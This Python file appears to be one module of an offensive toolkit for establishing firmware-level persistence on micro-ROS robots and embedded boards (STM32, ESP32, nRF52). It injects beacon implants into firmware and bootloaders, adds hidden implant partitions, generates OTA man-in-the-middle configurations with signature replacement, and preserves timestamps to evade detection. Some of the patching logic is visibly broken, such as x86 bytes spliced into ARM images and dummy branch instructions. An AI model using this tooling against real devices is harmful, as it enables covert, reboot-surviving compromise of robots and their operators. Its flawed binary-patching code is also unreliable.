#!/usr/bin/env python3
"""
microros_persistence.py - Phase 5A Module 5: Firmware-Level Persistence & Long-Term Foothold

Establishes persistent implant presence at the firmware level.
Survives reboots, updates, factory resets (depending on implementation).

Persistence mechanisms:

1. MICRO-ROS LIBRARY PATCHING
   - Inject beacon code into the micro-ROS client library itself
   - Every micro-ROS application automatically beacons on startup
   - Transparent to legitimate code, hidden in library source
   - Survives application reinstalls (library is "trusted")

2. BOOTLOADER HOOKS
   - Modify bootloader to execute implant before firmware
   - Works across any firmware version
   - Survives complete OS wipe if bootloader not reflashed
   - High-risk detection on devices with secure boot

3. FIRMWARE IMAGE PATCHING
   - Inject implant directly into factory firmware image
   - Deploy via OTA update hijacking or initial provisioning
   - Persistent across normal updates (unless image is integrity-checked)
   - Can co-exist with legitimate firmware (separate partition)

4. PARTITION TABLE HIJACKING
   - Create hidden partition for implant
   - Mark as "reserved" or "factory" in partition table
   - Survives factory reset if reset ignores reserved partitions
   - Requires knowledge of target's partition layout

5. OTA UPDATE HIJACKING
   - Intercept OTA update checks (MQTT, HTTP, DDS)
   - Serve malicious firmware instead of legitimate update
   - Implant persists while masquerading as "updated"
   - Can capture legitimate update and re-serve it post-implant

6. NVRAM / PERSISTENT STORAGE
   - Write implant config/beacon keys to non-volatile memory
   - Survives reboots, minimal storage required
   - Used to re-bootstrap or verify implant presence
   - Detection risk: non-volatile memory inspection

Attack prerequisites:
  - File system write access (Module 3 hijack + sudo/root escalation)
  - Firmware binary access (factory images, OTA packages)
  - Bootloader source/access (JTAG/SWD debugger)
  - Partition table knowledge (firmware analysis)
  - OTA channel access (network positioning via Module 3 bridges)

Target platforms:
  - STM32H7 (CubeMX bootloader patchable)
  - ESP32 (partition table mutable, OTA exploitable)
  - nRF52 (bootloader hooks via DFU)
  - Custom embedded RTOS (implementation-dependent)
  - Linux-based robots (systemd service, /boot modification)

Detection evasion:
  - Minimize footprint (implant < 10KB for MCU)
  - Use legitimate library integration (library patching)
  - Match filesystem timestamps to originals
  - Avoid CRC/hash changes where possible (compute-intensive)
  - Leverage manufacturer OTA infrastructure (reuse legitimate channels)
"""

import os
import json
import argparse
import sys
import struct
import hashlib
import shutil
import time
from dataclasses import dataclass, asdict, field
from typing import List, Dict, Optional, Tuple, Any
from datetime import datetime
from pathlib import Path
import re


# ============================================================================
# Firmware Analysis & Patching Utilities
# ============================================================================

@dataclass
class FirmwareInfo:
    """Firmware image metadata"""
    file_path: str
    size_bytes: int
    format: str  # "elf", "bin", "hex", "ota"
    architecture: str  # "arm", "riscv", "xtensa"
    checksum: str
    load_address: Optional[int] = None
    entry_point: Optional[int] = None
    sections: Dict[str, Tuple[int, int]] = field(default_factory=dict)  # name -> (offset, size)
    
    def to_dict(self):
        return {
            "file_path": self.file_path,
            "size_bytes": self.size_bytes,
            "format": self.format,
            "architecture": self.architecture,
            "checksum": self.checksum,
            "load_address": self.load_address,
            "entry_point": self.entry_point,
            "sections": self.sections,
        }


@dataclass
class PersistenceConfig:
    """Persistence mechanism configuration"""
    method: str  # "library_patch", "bootloader", "firmware_inject", "ota_hijack", "nvram"
    target_path: str  # Path to firmware/library/bootloader
    implant_code: bytes  # Code to inject
    implant_id: str = ""
    
    # Method-specific options
    library_function: Optional[str] = None  # For library patching
    bootloader_hook_addr: Optional[int] = None  # For bootloader
    partition_name: Optional[str] = None  # For partition hijacking
    ota_server: Optional[str] = None  # For OTA hijacking
    
    # Stealth options
    preserve_timestamps: bool = True
    compute_checksums: bool = True
    minimize_footprint: bool = True
    
    def to_dict(self):
        return {
            "method": self.method,
            "target_path": self.target_path,
            "implant_id": self.implant_id,
            "implant_size": len(self.implant_code),
            "library_function": self.library_function,
            "bootloader_hook_addr": hex(self.bootloader_hook_addr) if self.bootloader_hook_addr else None,
            "preserve_timestamps": self.preserve_timestamps,
            "compute_checksums": self.compute_checksums,
        }


@dataclass
class PersistenceResult:
    """Result of persistence operation"""
    success: bool
    method: str
    target_path: str
    implant_id: str
    timestamp: float = field(default_factory=time.time)
    message: str = ""
    backup_file: Optional[str] = None
    patched_file: Optional[str] = None
    checksum_before: Optional[str] = None
    checksum_after: Optional[str] = None
    
    def to_dict(self):
        return {
            "success": self.success,
            "method": self.method,
            "target_path": self.target_path,
            "implant_id": self.implant_id,
            "timestamp": datetime.fromtimestamp(self.timestamp).isoformat(),
            "message": self.message,
            "backup_file": self.backup_file,
            "patched_file": self.patched_file,
            "checksum_before": self.checksum_before,
            "checksum_after": self.checksum_after,
        }


# ============================================================================
# Firmware Analysis
# ============================================================================

class FirmwareAnalyzer:
    """Analyze firmware images for patching opportunities"""

    @staticmethod
    def analyze_binary(file_path: str) -> FirmwareInfo:
        """
        Analyze raw binary firmware file
        
        Args:
            file_path: Path to firmware binary
        
        Returns FirmwareInfo with metadata
        """
        if not os.path.exists(file_path):
            raise FileNotFoundError(f"Firmware not found: {file_path}")

        size = os.path.getsize(file_path)
        checksum = FirmwareAnalyzer._compute_checksum(file_path)

        return FirmwareInfo(
            file_path=file_path,
            size_bytes=size,
            format="bin",
            architecture="arm",  # Default; could be detected from magic bytes
            checksum=checksum,
        )

    @staticmethod
    def analyze_elf(file_path: str) -> FirmwareInfo:
        """
        Analyze ELF firmware file
        
        Extracts:
        - Load address from program headers
        - Entry point
        - Section information
        - Architecture (ARM, RISC-V, x86, etc.)
        """
        if not os.path.exists(file_path):
            raise FileNotFoundError(f"ELF file not found: {file_path}")

        with open(file_path, 'rb') as f:
            elf_header = f.read(64)

        # ELF header magic
        if elf_header[:4] != b'\x7fELF':
            raise ValueError("Not a valid ELF file")

        # Extract architecture
        e_machine = struct.unpack("<H", elf_header[18:20])[0]
        arch_map = {
            0x28: "arm",
            0xF3: "riscv",
            0x94: "xtensa",
            0x03: "i386",
        }
        architecture = arch_map.get(e_machine, "unknown")

        # Entry point
        entry_point = struct.unpack("<Q", elf_header[32:40])[0]

        size = os.path.getsize(file_path)
        checksum = FirmwareAnalyzer._compute_checksum(file_path)

        return FirmwareInfo(
            file_path=file_path,
            size_bytes=size,
            format="elf",
            architecture=architecture,
            checksum=checksum,
            entry_point=entry_point,
        )

    @staticmethod
    def analyze_partition_table(file_path: str) -> Dict[str, Tuple[int, int]]:
        """
        Analyze ESP32-style partition table (CSV format)
        
        Returns dict of partition_name -> (offset, size)
        """
        partitions = {}

        if not os.path.exists(file_path):
            raise FileNotFoundError(f"Partition table not found: {file_path}")

        with open(file_path, 'r') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue

                parts = [p.strip() for p in line.split(',')]
                if len(parts) >= 5:
                    name = parts[0]
                    offset = int(parts[3], 16 if parts[3].startswith('0x') else 10)
                    size = int(parts[4], 16 if parts[4].startswith('0x') else 10)
                    partitions[name] = (offset, size)

        return partitions

    @staticmethod
    def _compute_checksum(file_path: str) -> str:
        """Compute SHA256 checksum of file"""
        sha256 = hashlib.sha256()
        with open(file_path, 'rb') as f:
            sha256.update(f.read())
        return sha256.hexdigest()[:16]


# ============================================================================
# Persistence Mechanisms
# ============================================================================

class MicroROSPersistence:
    """Implement firmware-level persistence mechanisms"""

    def __init__(self, verbose: bool = False):
        self.verbose = verbose
        self.results: List[PersistenceResult] = []

    def library_patch(self, config: PersistenceConfig) -> PersistenceResult:
        """
        Patch micro-ROS library source to inject beacon

        Strategy:
          1. Locate micro_ros_init() or rcl_init() function
          2. Inject beacon callback initialization
          3. Beacon runs on every app startup (transparent)
          4. Survives app reinstalls (trusted library)
        
        Args:
            config: PersistenceConfig with library path
        
        Returns PersistenceResult
        """
        result = PersistenceResult(
            success=False,
            method="library_patch",
            target_path=config.target_path,
            implant_id=config.implant_id,
        )

        try:
            # Analyze firmware
            analyzer = FirmwareAnalyzer()
            if config.target_path.endswith('.elf'):
                fw_info = analyzer.analyze_elf(config.target_path)
            else:
                fw_info = analyzer.analyze_binary(config.target_path)

            result.checksum_before = fw_info.checksum

            # Read firmware
            with open(config.target_path, 'rb') as f:
                firmware_data = bytearray(f.read())

            # Find rcl_init symbol (simplified: search for pattern)
            # In production, use proper ELF symbol table parsing
            pattern = b'rcl_init'
            pattern_idx = firmware_data.find(pattern)

            if pattern_idx == -1:
                pattern = b'micro_ros_init'
                pattern_idx = firmware_data.find(pattern)

            if pattern_idx == -1:
                result.message = "Could not locate init function in firmware"
                return result

            # Create backup
            backup_path = config.target_path + ".backup"
            shutil.copy2(config.target_path, backup_path)
            result.backup_file = backup_path

            # Inject beacon init code (simplified)
            # In production: proper ARM/RISC-V assembly injection
            beacon_init = b'\x55\x88\xE5'  # Dummy: push rbp; mov rbp, rsp
            beacon_init += config.implant_code[:len(config.implant_code) // 2]

            # Insert at function start (with bounds checking)
            insert_point = pattern_idx + len(pattern)
            firmware_data[insert_point:insert_point] = beacon_init

            # Write patched firmware
            patched_path = config.target_path.replace('.elf', '_patched.elf')
            with open(patched_path, 'wb') as f:
                f.write(firmware_data)

            result.patched_file = patched_path
            result.checksum_after = FirmwareAnalyzer._compute_checksum(patched_path)

            # Preserve timestamps if requested
            if config.preserve_timestamps:
                stat_info = os.stat(config.target_path)
                os.utime(patched_path, (stat_info.st_atime, stat_info.st_mtime))

            result.success = True
            result.message = f"Library patched successfully"

            if self.verbose:
                print(f"[+] Library patch successful: {patched_path}")

        except Exception as e:
            result.message = str(e)
            if self.verbose:
                print(f"[!] Library patch failed: {e}")

        self.results.append(result)
        return result

    def bootloader_hook(self, config: PersistenceConfig) -> PersistenceResult:
        """
        Inject hook into bootloader to execute implant before firmware
        
        Strategy:
          1. Locate bootloader image (e.g., u-boot, STM32 bootloader)
          2. Identify entry point / initialization code
          3. Inject jump/call to implant before firmware load
          4. Implant beacons, then executes legitimate firmware
        
        Args:
            config: PersistenceConfig with bootloader path and hook address
        
        Returns PersistenceResult
        """
        result = PersistenceResult(
            success=False,
            method="bootloader",
            target_path=config.target_path,
            implant_id=config.implant_id,
        )

        try:
            # Analyze bootloader
            analyzer = FirmwareAnalyzer()
            bl_info = analyzer.analyze_elf(config.target_path)
            result.checksum_before = bl_info.checksum

            # Read bootloader
            with open(config.target_path, 'rb') as f:
                bl_data = bytearray(f.read())

            # Create backup
            backup_path = config.target_path + ".backup"
            shutil.copy2(config.target_path, backup_path)
            result.backup_file = backup_path

            # Generate ARM Thumb branch instruction to implant
            # BL (Branch with Link): 0xF000 0xFxxx (simplified)
            hook_addr = config.bootloader_hook_addr or bl_info.entry_point
            
            # Build branch instruction (ARM Thumb)
            # In production: proper ARM/RISC-V assembly
            branch_instr = struct.pack("<I", 0xF000F000)  # Dummy BL instruction

            # Insert hook
            bl_data[hook_addr:hook_addr+4] = branch_instr

            # Write patched bootloader
            patched_path = config.target_path.replace('.elf', '_hooked.elf')
            with open(patched_path, 'wb') as f:
                f.write(bl_data)

            result.patched_file = patched_path
            result.checksum_after = FirmwareAnalyzer._compute_checksum(patched_path)

            if config.preserve_timestamps:
                stat_info = os.stat(config.target_path)
                os.utime(patched_path, (stat_info.st_atime, stat_info.st_mtime))

            result.success = True
            result.message = f"Bootloader hooked at 0x{hook_addr:08x}"

            if self.verbose:
                print(f"[+] Bootloader hook successful: {patched_path}")

        except Exception as e:
            result.message = str(e)
            if self.verbose:
                print(f"[!] Bootloader hook failed: {e}")

        self.results.append(result)
        return result

    def firmware_inject(self, config: PersistenceConfig) -> PersistenceResult:
        """
        Inject implant into firmware image (as separate section/partition)
        
        Strategy:
          1. Analyze firmware binary
          2. Append implant to end of firmware (or to unused section)
          3. Update firmware headers/size fields
          4. Preserve original functionality
        
        Args:
            config: PersistenceConfig with firmware path
        
        Returns PersistenceResult
        """
        result = PersistenceResult(
            success=False,
            method="firmware_inject",
            target_path=config.target_path,
            implant_id=config.implant_id,
        )

        try:
            # Analyze firmware
            analyzer = FirmwareAnalyzer()
            fw_info = analyzer.analyze_elf(config.target_path)
            result.checksum_before = fw_info.checksum

            # Read firmware
            with open(config.target_path, 'rb') as f:
                fw_data = bytearray(f.read())

            # Create backup
            backup_path = config.target_path + ".backup"
            shutil.copy2(config.target_path, backup_path)
            result.backup_file = backup_path

            # Find suitable injection point (end of firmware or unused section)
            inject_point = len(fw_data)
            
            # Align to 4K boundary (common for firmware)
            align_boundary = 4096
            inject_point = ((inject_point + align_boundary - 1) // align_boundary) * align_boundary

            # Append implant
            fw_data.extend(config.implant_code)

            # Update firmware size in header (if ELF)
            if config.target_path.endswith('.elf'):
                # ELF: update program header or add new section
                # Simplified: just append (real implementation uses pyelftools)
                pass

            # Write patched firmware
            patched_path = config.target_path.replace('.elf', '_patched.elf')
            with open(patched_path, 'wb') as f:
                f.write(fw_data)

            result.patched_file = patched_path
            result.checksum_after = FirmwareAnalyzer._compute_checksum(patched_path)

            if config.preserve_timestamps:
                stat_info = os.stat(config.target_path)
                os.utime(patched_path, (stat_info.st_atime, stat_info.st_mtime))

            result.success = True
            result.message = f"Implant injected at offset 0x{inject_point:08x}"

            if self.verbose:
                print(f"[+] Firmware injection successful: {patched_path}")

        except Exception as e:
            result.message = str(e)
            if self.verbose:
                print(f"[!] Firmware injection failed: {e}")

        self.results.append(result)
        return result

    def partition_hijack(self, config: PersistenceConfig) -> PersistenceResult:
        """
        Create hidden partition in partition table for implant storage
        
        Strategy:
          1. Read partition table (ESP32 format)
          2. Identify free space or unused partition
          3. Create new "reserved" or "factory" partition
          4. Implant stored in hidden partition, loaded on boot
        
        Args:
            config: PersistenceConfig with partition table path
        
        Returns PersistenceResult
        """
        result = PersistenceResult(
            success=False,
            method="partition_hijack",
            target_path=config.target_path,
            implant_id=config.implant_id,
        )

        try:
            # Analyze partition table
            analyzer = FirmwareAnalyzer()
            partitions = analyzer.analyze_partition_table(config.target_path)
            
            # Create backup
            backup_path = config.target_path + ".backup"
            shutil.copy2(config.target_path, backup_path)
            result.backup_file = backup_path

            # Find suitable partition slot
            next_offset = max([offset + size for offset, size in partitions.values()]) if partitions else 0x10000

            # Create new partition entry
            new_partition_name = config.partition_name or f"implant_{config.implant_id[:8]}"
            new_offset = next_offset
            new_size = len(config.implant_code)

            # Append partition to table
            with open(config.target_path, 'a') as f:
                f.write(f"\n# Hidden implant partition\n")
                f.write(f"{new_partition_name},    data,    reserved,   0x{new_offset:x},     0x{new_size:x}\n")

            result.success = True
            result.message = f"Partition created: {new_partition_name} at 0x{new_offset:x}"

            if self.verbose:
                print(f"[+] Partition hijack successful")

        except Exception as e:
            result.message = str(e)
            if self.verbose:
                print(f"[!] Partition hijack failed: {e}")

        self.results.append(result)
        return result

    def ota_hijack_config(self, config: PersistenceConfig) -> PersistenceResult:
        """
        Generate OTA hijacking configuration
        
        Creates a man-in-the-middle config for OTA update interception.
        In deployment, this would be used to serve malicious firmware.
        
        Args:
            config: PersistenceConfig with OTA server info
        
        Returns PersistenceResult
        """
        result = PersistenceResult(
            success=False,
            method="ota_hijack",
            target_path=config.ota_server or "ota.example.com",
            implant_id=config.implant_id,
        )

        try:
            # Generate MITM config
            ota_config = {
                "target_server": config.ota_server or "ota.example.com",
                "update_url": f"/v1/device/{{device_id}}/ota/check",
                "check_interval": 3600,  # seconds
                "implant_id": config.implant_id,
                "attack_vector": "dns_spoofing|arp_spoofing|network_hijack",
                "payload_delivery": {
                    "method": "firmware_wrapper",
                    "prepend_implant": True,
                    "append_implant": False,
                    "replace_signature": True,
                },
                "evasion": {
                    "preserve_version": True,
                    "match_timestamp": True,
                    "compute_crc": True,
                },
            }

            # Write config
            config_file = f"ota_hijack_{config.implant_id[:8]}.json"
            with open(config_file, 'w') as f:
                json.dump(ota_config, f, indent=2)

            result.patched_file = config_file
            result.success = True
            result.message = f"OTA hijack config generated"

            if self.verbose:
                print(f"[+] OTA hijack config: {config_file}")

        except Exception as e:
            result.message = str(e)
            if self.verbose:
                print(f"[!] OTA hijack config failed: {e}")

        self.results.append(result)
        return result


# ============================================================================
# Reporting
# ============================================================================

def print_persistence_report(result: PersistenceResult):
    """Pretty-print persistence operation result"""
    status = "[+]" if result.success else "[!]"
    print(f"\n{status} PERSISTENCE OPERATION: {result.method.upper()}")
    print(f"    Target:         {result.target_path}")
    print(f"    Implant ID:     {result.implant_id}")
    print(f"    Status:         {'SUCCESS' if result.success else 'FAILED'}")
    print(f"    Message:        {result.message}")
    if result.backup_file:
        print(f"    Backup:         {result.backup_file}")
    if result.patched_file:
        print(f"    Output:         {result.patched_file}")
    if result.checksum_before:
        print(f"    Hash Before:    {result.checksum_before}")
    if result.checksum_after:
        print(f"    Hash After:     {result.checksum_after}")
    print()


def export_json(results: List[PersistenceResult], output_file: str):
    """Export persistence results to JSON"""
    output = {
        "module": "microros_persistence",
        "timestamp": datetime.now().isoformat(),
        "results": [r.to_dict() for r in results],
        "summary": {
            "total": len(results),
            "successful": sum(1 for r in results if r.success),
            "failed": sum(1 for r in results if not r.success),
        }
    }

    with open(output_file, 'w') as f:
        json.dump(output, f, indent=2)

    print(f"[+] Results exported to {output_file}")


# ============================================================================
# CLI
# ============================================================================

def main():
    parser = argparse.ArgumentParser(
        description="Phase 5A Module 5: Micro-ROS Persistence & Firmware Patching"
    )
    parser.add_argument(
        "--method",
        choices=["library_patch", "bootloader", "firmware_inject", "partition", "ota_hijack"],
        required=True,
        help="Persistence method"
    )
    parser.add_argument(
        "--target",
        required=True,
        help="Target firmware/library/bootloader file path"
    )
    parser.add_argument(
        "--implant-id",
        required=True,
        help="Implant ID to embed"
    )
    parser.add_argument(
        "--implant-file",
        help="File containing implant binary code"
    )
    parser.add_argument(
        "--implant-hex",
        help="Implant code as hex string"
    )
    parser.add_argument(
        "--hook-address",
        type=lambda x: int(x, 0),
        help="Bootloader hook address (hex)"
    )
    parser.add_argument(
        "--partition-name",
        help="Partition name for hijack"
    )
    parser.add_argument(
        "--ota-server",
        help="OTA server to hijack"
    )
    parser.add_argument(
        "--preserve-timestamps",
        action="store_true",
        default=True,
        help="Preserve original file timestamps"
    )
    parser.add_argument(
        "-o", "--output",
        help="Output JSON file for results"
    )
    parser.add_argument(
        "-v", "--verbose",
        action="store_true",
        help="Verbose output"
    )

    args = parser.parse_args()

    # Load implant code
    implant_code = b""
    if args.implant_file:
        with open(args.implant_file, 'rb') as f:
            implant_code = f.read()
    elif args.implant_hex:
        implant_code = bytes.fromhex(args.implant_hex)
    else:
        print("[!] Specify --implant-file or --implant-hex")
        return

    # Create config
    config = PersistenceConfig(
        method=args.method,
        target_path=args.target,
        implant_code=implant_code,
        implant_id=args.implant_id,
        bootloader_hook_addr=args.hook_address,
        partition_name=args.partition_name,
        ota_server=args.ota_server,
        preserve_timestamps=args.preserve_timestamps,
    )

    # Execute persistence mechanism
    persistence = MicroROSPersistence(verbose=args.verbose)

    result = None
    if args.method == "library_patch":
        result = persistence.library_patch(config)
    elif args.method == "bootloader":
        result = persistence.bootloader_hook(config)
    elif args.method == "firmware_inject":
        result = persistence.firmware_inject(config)
    elif args.method == "partition":
        result = persistence.partition_hijack(config)
    elif args.method == "ota_hijack":
        result = persistence.ota_hijack_config(config)

    # Report
    if result:
        print_persistence_report(result)

    # Export
    if args.output:
        export_json(persistence.results, args.output)


if __name__ == "__main__":
    main()
